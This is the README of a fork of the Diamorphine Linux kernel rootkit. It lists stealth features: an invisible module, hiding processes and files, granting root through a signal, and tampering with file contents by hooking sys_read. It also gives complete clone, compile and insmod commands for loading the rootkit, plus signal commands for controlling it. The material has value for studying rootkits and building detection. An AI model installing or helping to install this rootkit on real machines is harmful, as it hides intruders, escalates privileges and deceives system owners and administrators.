Diamorphine
===========

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64
This fork is just me trying to implement new features in m0nad's awesome rk.

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisible;

- File content tampering by hooking sys_read (I basically just copied this feature from f0rb1dd3n reptile with a few changes to make it work here. Don't expect much uheauh.  

- Source: https://github.com/m0nad/Diamorphine

Configure
--

Change diamorphine.h `HIDETAGIN` and `HIDETAGOUT` 
Example: 
```
#define HIDETAGIN "<viajano>"
#define HIDETAGOUT "</viajano>"

```
Install
--

Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Uninstall
--

The module starts invisible, to remove you need to make it visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```

References
--
f0rb1dd3n RK 
https://github.com/f0rb1dd3n/Reptile/

Ritsec Linux Syscall Hooking introduction
https://ritcsec.wordpress.com/2020/11/22/linux-syscall-hooking/

Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/

zizzu0 LinuxKernelModules
https://github.com/zizzu0/LinuxKernelModules/

Linux Rootkits: New Methods for Kernel 5.7+
https://xcellerator.github.io/posts/linux_rootkits_11/
